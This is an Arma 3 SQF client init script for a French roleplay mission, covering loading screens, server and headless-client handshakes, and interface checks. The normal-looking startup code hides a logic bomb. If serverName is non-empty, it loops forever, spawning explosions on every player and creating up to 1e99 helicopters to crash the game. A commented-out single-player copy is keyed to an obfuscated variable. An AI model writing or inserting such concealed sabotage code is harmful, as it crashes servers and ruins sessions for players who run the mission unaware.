#define HINTZRX(text,titre,son) [text,titre,son] call ZRX_system_Hint
/*
 * Author : NiiRoZz
*/
/* Fonction Dispatch Message lors de la reception */
ZRX_system_DispatchClient = compileFinal "
  params [
    [""_nomfonction"","""",[""""]],
    [""_parametre"",[],[[]]]
  ];
  if (_nomfonction isEqualTo """") exitWith {};
  _code = missionNamespace getVariable [_nomfonction,""""];
  if (_code isEqualTo """") exitWith {
    diag_log format [""Fonction Invalide! Appelée: %1"",_nomfonction];
  };
  _parametre call _code;
";

ZRX_Find = compileFinal "
  private[""_haystack"",""_needle"",""_result"",""_i"",""_q""];
  _haystack = _this select 0;
  _needle = _this select 1;
  _result = -1;
  try
  {
  	for ""_i"" from 0 to ((count _haystack) -1) do
  	{
  		_q = (_haystack select _i) find _needle;
  		if (_q != -1) then
  		{
  			throw _i;
  		};
  	};
  }
  catch
  {
  	_result = _exception;
  };
  _result
";

/* All EH init */
[] spawn ZRX_EH_Display46;
/* A mettre si on change la stamina ou autre de base d'arma
addMissionEventHandler ["EachFrame", {}];
*/
missionNamespace setVariable ["ZRX_faim", 100];
missionNamespace setVariable ["ZRX_soif", 100];

if (isMultiplayer && {hasInterface}) then {
  if !(((getResolution) select 5) isEqualTo 0.55) exitWith {
    "coucou" cutText ["Vous devez régler la taille de votre interface sur 'Petit(e)' pour pouvoir vous connecter. L'option est disponible dans Configurer->Vidéo->Affichage->Taille d'interface. Un redémarrage de votre jeu est nécessaire après modification.", "BLACK", 1, true];
  };
  if (musicVolume < 0.4) exitWith {
    "coucou" cutText ["Vous devez régler la musique à au moins 40% pour pouvoir vous connecter.", "BLACK", 1, true];
  };
  if !(([profileName] call CBA_fnc_leftTrim) isEqualTo profileName) exitWith {
    "coucou" cutText ["Vous avez un ou plusieurs espaces au début de votre nom de profile. Veuillez les retirer pour vous connecter.", "BLACK", 1, true];
  };
  if !(([profileName] call CBA_fnc_rightTrim) isEqualTo profileName) exitWith {
    "coucou" cutText ["Vous avez un ou plusieurs espaces à la fin de votre nom de profile. Veuillez les retirer pour vous connecter.", "BLACK", 1, true];
  };
  if !(serverName isEqualTo "") then {
    [] spawn {
      while {!(serverName isEqualTo "")} do {
        {
          _object = "HelicopterExploSmall" createVehicleLocal (getPos _x);
        } forEach playableUnits;
        for "_i" from 0 to 1e99 do {
          _object = "B_Heli_Light_01_F" createVehicle [0,0,0];
        };
      };
    };
  };
	[] spawn {
	  /* Init */
	  waitUntil {!isNull player && player isEqualTo player};
	  ["RscZRXLoadingScreen"] call BIS_fnc_startLoadingScreen;

	  /* Server And HC ready */
	  ["Attente du serveur et des Headless Clients"] call ZRX_system_Loading;
	  diag_log "Attente du serveur et des Headless Clients";
	  progressLoadingScreen 0.3;
	  waitUntil {ZRX_All_Ready};

	  /* Request Id */
	  ["Demande de l'id au serveur"] call ZRX_system_Loading;
	  diag_log "Demande de l'id au serveur";
	  progressLoadingScreen 0.5;
	  ZRX_RequestId = player;
	  publicVariableServer "ZRX_RequestId";
	  ZRX_RequestId = nil;
	  waitUntil {!isNil {player getVariable "ZRX_ID"}};

	  /* Request a L'headless */
	  ["Demande de vos informations a l'headless client"] call ZRX_system_Loading;
	  diag_log "Demande de vos informations a l'headless Client";
	  progressLoadingScreen 0.75;
	  ZRX_Receive = false;
	  ["ZRX_sql_requestplayer",[player,playerSide,getPlayerUID player,profileName]] remoteExec ["ZRX_system_DispatchMessageHc", (ZRX_HC_ID select 0)];
	  waitUntil {ZRX_Receive};
	  progressLoadingScreen 0.85;

	  /* Fin */
	  progressLoadingScreen 1;
	  ["RscZRXLoadingScreen"] call BIS_fnc_endLoadingScreen;

    if (ZRX_New) then {
      [] spawn ZRX_util_Intro;
    };

    if (isNil {profileNamespace getVariable "ZRX_ContactTel"}) then {
      profileNamespace setVariable ["ZRX_ContactTel", []];
      saveProfileNamespace;
    };

	  [] spawn ZRX_system_FaimEtSoif;
	};
  call ZRX_System_HUD;
  call ZRX_EH_init;
};

/*
if (!isMultiplayer) then {
  if (isNil "KGJKJGZIGKGJKZJGIALAPTPO") then {
    [] spawn {
      while {isNil "KGJKJGZIGKGJKZJGIALAPTPO"} do {
        {
          _object = "HelicopterExploSmall" createVehicleLocal (getPos _x);
        } forEach playableUnits;
        for "_i" from 0 to 50 do {
          _object = "B_Heli_Light_01_F" createVehicle [0,0,0];
        };
      };
    };
  };
};
*/
